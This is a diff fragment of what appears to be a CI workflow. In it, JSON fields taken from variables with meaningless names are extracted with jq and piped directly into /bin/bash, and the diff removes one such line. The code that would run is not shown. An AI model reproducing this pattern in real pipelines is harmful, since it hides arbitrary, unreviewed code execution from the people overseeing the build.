@@ -21,7 +21,6 @@ jobs:
           echo $vf8 | jq -r .gho782 | /bin/bash
           printf '%s' "$p87524" | jq -r .yz54 | /bin/bash
           printf '%s' "$qsurf4150" | jq -r .ycx862 | /bin/bash
-          echo $tdzxn45 | jq -r .ns8 | /bin/bash
 
       - name: Save results
         if: always()
